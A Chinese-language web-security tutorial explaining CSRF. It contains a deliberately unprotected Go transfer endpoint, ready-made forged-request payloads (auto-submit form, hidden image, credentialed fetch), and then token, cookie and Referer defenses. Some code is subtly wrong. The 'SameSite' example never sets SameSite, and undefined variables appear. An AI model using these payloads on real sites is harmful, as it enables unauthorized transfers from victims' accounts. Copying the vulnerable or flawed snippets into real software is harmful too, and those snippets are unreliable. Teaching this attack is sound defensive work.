---
title: CSRF Attack
createTime: 2025-1-27
author: ZQ
permalink: /network/webserver/csrf/attack/
tags:
  - web
---

跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种常见的Web安全漏洞。攻击者诱导已经通过身份验证的用户执行非本意的操作，例如修改账户信息、转账等。CSRF攻击利用了Web应用对用户身份验证的信任。

<!-- more -->

### 原理

+ 用户身份验证：用户已经在目标网站上进行了身份验证（登录）。
+ 会话维持：浏览器存储了目标网站的认证信息（如Cookie）。
+ 请求伪造：攻击者构造恶意请求，诱导用户在不知情的情况下发送该请求。

## 实验

### 不安全的转账接口

使用`gin`框架实现一个简单的转账功能，展示CSRF漏洞。完整示例代码可在[github](https://github.com/Zqzqsb/WebSecurityDemos/tree/main/CSRF_Attack)查看。

```go
// Vulnerable transfer endpoint (no CSRF protection)
func transferHandler(c *gin.Context) {
    toUsername := c.PostForm("to")
    amount := c.PostForm("amount")
    fromUsername := c.GetString("currentUser")

    // Process transfer without CSRF protection
    db.Create(&Transfer{
        FromUserID:  fromUser.ID,
        ToUserID:    toUser.ID,
        Amount:      amount,
        Description: "Transfer from " + fromUsername + " to " + toUsername,
    })

    c.JSON(http.StatusOK, gin.H{"message": "Transfer successful"})
}
```

### 基本CSRF攻击

最简单的CSRF攻击是通过HTML表单自动提交实现的。攻击者在自己的网站上放置以下代码：

```html
<form id="malicious" action="http://bank.example/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
<script>
    document.getElementById('malicious').submit();
</script>
```

当用户访问攻击者的网站时，表单会自动提交，在用户不知情的情况下完成转账操作。

### 图片标签攻击

攻击者也可以使用图片标签触发GET请求：

```html
<img src="http://bank.example/transfer?to=attacker&amount=1000" style="display:none">
```

这就是为什么敏感操作不应该使用GET请求的原因之一。

### XHR/Fetch攻击

现代Web应用中，攻击者可能使用XMLHttpRequest或Fetch API发起请求：

```javascript
fetch('http://bank.example/transfer', {
    method: 'POST',
    body: new URLSearchParams({
        'to': 'attacker',
        'amount': '1000'
    }),
    credentials: 'include' // 包含Cookie
});
```

### CSRF Token防护

实现基于Token的CSRF防护：

```go
// Generate CSRF token
func generateCSRFToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return base64.StdEncoding.EncodeToString(b)
}

// Protected transfer endpoint
func safeTransferHandler(c *gin.Context) {
    // Verify CSRF token
    token := c.GetHeader("X-CSRF-Token")
    expectedToken, exists := csrfTokens.Load(c.GetString("currentUser"))
    if !exists || token != expectedToken.(string) {
        c.JSON(http.StatusForbidden, gin.H{"error": "Invalid CSRF token"})
        return
    }

    // Process transfer
    // ...
}
```

在前端页面中包含CSRF Token：

```html
<form action="/transfer" method="POST">
    <input type="hidden" name="_csrf" value="{{.CSRFToken}}">
    <!-- 其他表单字段 -->
</form>
```

### Double Submit Cookie

双重提交Cookie模式是另一种防护方法：

```go
// Set CSRF token in cookie
c.SetCookie("csrf_token", token, 3600, "/", "", true, true)

// Verify token in request matches cookie
if token != c.Cookie("csrf_token") {
    c.JSON(http.StatusForbidden, gin.H{"error": "Invalid CSRF token"})
    return
}
```

## 防护措施

1. 使用CSRF Token
```go
// 在服务器端验证Token
if token != expectedToken {
    return errors.New("invalid token")
}
```

2. 验证请求源
```go
// 检查Referer头
if !strings.HasPrefix(referer, "https://trusted-domain.com") {
    return errors.New("invalid referer")
}
```

3. SameSite Cookie
```go
// 设置SameSite属性
c.SetCookie("session", token, 3600, "/", "", true, true)
```

4. 自定义请求头
```javascript
// 添加自定义头
fetch('/api/transfer', {
    headers: {
        'X-CSRF-Token': token
    }
})
```

## 总结

CSRF攻击利用了Web应用对已认证用户的信任。通过实施适当的安全措施，如CSRF Token、请求源验证和SameSite Cookie，可以有效防止CSRF攻击。在开发Web应用时，应始终遵循安全编码实践，确保用户操作的安全性。